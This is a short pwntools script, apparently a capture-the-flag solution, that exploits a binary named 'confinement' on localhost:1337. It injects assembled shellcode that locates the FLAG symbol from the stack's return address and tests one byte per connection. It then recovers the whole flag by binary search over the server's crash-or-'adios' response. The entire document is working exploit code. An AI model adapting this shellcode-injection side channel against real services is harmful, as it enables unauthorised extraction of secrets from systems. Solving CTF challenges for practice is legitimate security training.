from pwn import *

elf = ELF('./confinement')
# context.log_level = "debug"
context.binary = elf

main_ret = 0x222c6
flag = elf.sym["FLAG"]
shift = flag - main_ret
imm = 0xfe
index = 0xff
s = asm(f"""
mov rax, [rsp]
add rax, {shift}
cmp BYTE PTR [rax + {index}], {imm}
jbe kaboom
ret
kaboom:
""")
index_offset = s.find(b"\xff")
imm_offset = s.find(b"\xfe")

def payload(index, imm):
    assert index <= 0xff
    assert imm <= 0xff
    xs = bytearray(s)
    xs[index_offset] = index
    xs[imm_offset] = imm
    return xs

h = bytes(list(range(0x20, 0x80)))

def test(index, imm):
    # p = process()
    p = remote("localhost", 1337)
    p.send(payload(index, imm))
    res = p.recvline().startswith(b"adios")
    p.close()
    return res

def binary_search(pos):
    lo = 0
    hi = len(h)
    while lo != hi:
        mid = (lo + hi) // 2
        if test(pos, h[mid]): 
            lo = mid + 1
        else:
            hi = mid
    ret = h[lo]
    return ret

flag = ""
i = 0
while True:
    c = chr(binary_search(i))
    flag += c
    if c == "}":
        break
    i += 1
print(flag)
